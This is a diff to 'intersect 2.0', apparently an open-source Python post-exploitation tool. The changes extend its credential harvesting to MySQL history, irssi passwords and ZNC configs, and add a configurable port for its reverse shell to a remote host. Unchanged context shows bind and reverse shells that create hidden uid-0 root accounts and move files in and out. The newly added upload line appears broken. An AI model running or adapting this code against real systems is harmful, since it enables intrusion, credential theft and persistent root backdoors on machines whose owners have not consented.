@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # intersect 2.0 | created by ohdae
-# copyright 2011-2014
+# copyright 2012
 # email: bindshell[at]live[dot]com
 # twitter: @ohdae
 # http://github.com/ohdae/Intersect-2.0/ || http://bindshell.it.cx/intersect.html
@@ -54,7 +54,7 @@ def usage():
     
    __version__ = "revision 2.2.1"
    __author__ = "ohdae"
-   __website__ = "http://bind.shell.la"
+   __website__ = "http://bindshell.it.cx"
    
    print("=====================================================")                                                                    
    print("       intersect 2.0 | automated post-exploitation")
@@ -90,9 +90,11 @@ def environment():
    global LASTLOG_FILEPATH
    global Config_Dir
    global RHOST
+   global RPORT
 
-   # Change RHOST accordingly if you're going to use the reverse shell   
+   # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
    RHOST = '192.168.1.19'
+   RPORT = 443
 
    fullkernel = os.uname()[2]
    splitkern = fullkernel.split("-")
@@ -188,8 +190,8 @@ def Gather_OS():
       os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
    elif distro == "slackware":
       os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
-   else:
-      pass
+   elif whereis('chkconfig') is not None:
+      os.system("chkconfig -A > services_list.txt")
 
    os.system("mount -l > mount.txt")
    os.system("cat /etc/sysctl.conf > sysctl.txt")
@@ -206,6 +208,8 @@ def Gather_OS():
         shutil.copy2(Home_Dir+"/.bash_history", "bash_history.txt")
    if os.path.exists(Home_Dir+"/.viminfo") is True:
        shutil.copy2(Home_Dir+"/.viminfo", "viminfo")
+   if os.path.exists(Home_Dir+"/.mysql_history") is True:
+       shutil.copy2(Home_Dir+"/.mysql_history", "mysql_history")
    
    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
    content = ''
@@ -264,7 +268,7 @@ def GetCredentials():
         for user in users:
             if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                 accts = open("/home/"+user+"/.purple/accounts.xml")
-                saved = open('Pidgin.txt', 'a')
+                saved = open("Pidgin.txt", "a")
                 for line in accts.readlines():
                     if '<protocol>' in line:
                         saved.write(line)
@@ -274,8 +278,27 @@ def GetCredentials():
                         saved.write(line)
                     else:
                         pass
+                    
                 accts.close()
                 saved.close()
+
+    for user in users:
+        if os.path.exists("/home/"+user+"/.irssi/config") is True:
+            accts = open("/home/"+user+"/.irssi/config")
+            saved = open("irssi.txt", "a")
+            for line in accts.readlines():
+                if "password = " in line:
+                    saved.write(line)
+                else:
+                    pass
+            accts.close()
+            saved.close()
+
+    for user in users:
+        if os.path.exists("/home/"+user+"/.znc/configs/znc.conf") is True:
+            shutil.copy2("/home/"+user+"/.znc/configs/znc.conf", "znc.conf")
+        else:
+            pass           
             
 
 def NetworkInfo():
@@ -437,6 +460,9 @@ def FindExtras():
 	file = open("GitRepos.txt","a")
         file.write(output),
         file.close()
+
+    if whereis('svn') is not None:
+        os.system("find / -name *.svn > SvnRepos.txt")
                
     if os.path.exists("~/.msf4/") is True:
         os.system("ls -l ~/.msf/loot > MetasploitLoot.txt")
@@ -574,9 +600,9 @@ def bindShell():
     try:
         server.bind((HOST, PORT))
         server.listen(10)
-        print "[!] Shell bound on 443"
+        print "[+] Shell bound on 443"
         conn, addr = server.accept()
-        print "[!] New Connection: %s" % addr[0]
+        print "[+] New Connection: %s" % addr[0]
         conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
     except:
         print "[!] Connection closed."
@@ -603,17 +629,17 @@ def bindShell():
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send("[!] Root account " + acct + " has been created.")   
+            conn.send("[+] Root account " + acct + " has been created.")   
         elif cmd.startswith('upload'):
             data = conn.recv(1024)
             strip = data.split(" ")
-            filename = strip[1]
+            (filepath, filename) = os.path.split(strip)
             data = conn.recv(1024)
             filewrite=file(filename, "wb")
             filewrite.write(data)
             filewrite.close()
             if os.path.isfile(filename):
-                conn.send("[!] File upload complete!")
+                conn.send("[+] File upload complete!")
             if not os.path.isfile(filename):
                 conn.send("[!] File upload failed! Please try again")
         elif cmd.startswith('download'):
@@ -694,15 +720,15 @@ def bindShell():
 
 def reverseShell():
     #Change RHOST in environment() to your remote host
-    PORT = 443
     socksize = 4096
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     try:
-        conn.connect((RHOST, PORT))
+        conn.connect((RHOST, RPORT))
+        conn.send("[+] New connection established!")
         conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
     except:
-        print("[!] Connection error! Is your listener running?")
+        print("[!] Connection error!")
         sys.exit(2)
 
     while True:
@@ -726,7 +752,7 @@ def reverseShell():
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send("[!] Root account " + acct + " has been created.")   
+            conn.send("[+] Root account " + acct + " has been created.")   
         elif cmd.startswith('upload'):
             data = conn.recv(1024)
             strip = data.split(" ")
@@ -736,7 +762,7 @@ def reverseShell():
             filewrite.write(data)
             filewrite.close()
             if os.path.isfile(filename):
-                conn.send("[!] File upload complete!")
+                conn.send("[+] File upload complete!")
             if not os.path.isfile(filename):
                 conn.send("[!] File upload failed! Please try again")
         elif cmd.startswith('download'):
